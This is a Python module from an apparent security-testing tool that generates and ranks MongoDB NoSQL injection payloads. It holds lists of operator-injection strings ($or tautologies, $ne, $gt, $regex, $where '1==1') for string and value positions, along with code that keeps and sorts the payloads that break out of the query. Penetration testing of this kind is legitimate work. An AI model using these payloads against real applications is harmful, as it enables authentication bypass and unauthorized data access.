"""NoSQL (MongoDB) injection payload mutation engine."""

from __future__ import annotations

from dataclasses import dataclass, field

from ..models import Context, Risk
from .context import analyze_nosql_context

# Bodies injected after closing a JSON string value.
_STRING_BODIES = [
    ('", "$or": [{}], "x": "', "or-tautology"),
    ('", "$ne": "', "ne-operator"),
    ('", "$gt": "", "x": "', "gt-operator"),
    ('", "$regex": ".*", "x": "', "regex"),
    ('", "$where": "1==1", "x": "', "where-js"),
]

# Whole-value payloads for an unquoted value position.
_VALUE_BODIES = [
    ('{"$ne": null}', "ne-operator"),
    ('{"$gt": ""}', "gt-operator"),
    ('{"$regex": ".*"}', "regex"),
    ('{"$where": "1==1"}', "where-js"),
    ('{"$exists": true}', "exists"),
]

_RISK_ORDER = {
    Risk.CRITICAL: 4,
    Risk.HIGH: 3,
    Risk.MEDIUM: 2,
    Risk.LOW: 1,
    Risk.NONE: 0,
}


@dataclass
class NoSqlCandidate:
    payload: str
    risk: Risk
    command_injected: bool
    syntax_valid: bool
    strategy: str


@dataclass
class NoSqlMutationResult:
    template: str
    context: Context
    generated: int
    valid: int
    candidates: list[NoSqlCandidate] = field(default_factory=list)

    @property
    def high_probability(self) -> list[str]:
        return [c.payload for c in self.candidates[:10]]

    def to_dict(self) -> dict:
        return {
            "template": self.template,
            "context": self.context.value,
            "generated": self.generated,
            "valid": self.valid,
            "high_probability": self.high_probability,
            "candidates": [
                {
                    "payload": c.payload,
                    "risk": c.risk.value,
                    "command_injected": c.command_injected,
                    "syntax_valid": c.syntax_valid,
                    "strategy": c.strategy,
                }
                for c in self.candidates
            ],
        }


def _generate(context: Context) -> list[tuple[str, str]]:
    bodies = _STRING_BODIES if context == Context.NOSQL_STRING else _VALUE_BODIES
    return list(bodies)


def mutate_nosql(template: str) -> NoSqlMutationResult:
    """Generate and rank NoSQL injection payloads for ``template``."""
    from .analyzer import analyze_nosql

    context = analyze_nosql_context(template)
    generated = _generate(context)

    candidates: list[NoSqlCandidate] = []
    for payload, strategy in generated:
        result = analyze_nosql(template, payload)
        if result.breakout.command_injected:
            candidates.append(
                NoSqlCandidate(
                    payload=payload,
                    risk=result.risk,
                    command_injected=True,
                    syntax_valid=result.balance.syntax_valid,
                    strategy=strategy,
                )
            )

    candidates.sort(
        key=lambda c: (_RISK_ORDER[c.risk], c.syntax_valid, -len(c.payload)),
        reverse=True,
    )

    return NoSqlMutationResult(
        template=template,
        context=context,
        generated=len(generated),
        valid=len(candidates),
        candidates=candidates,
    )
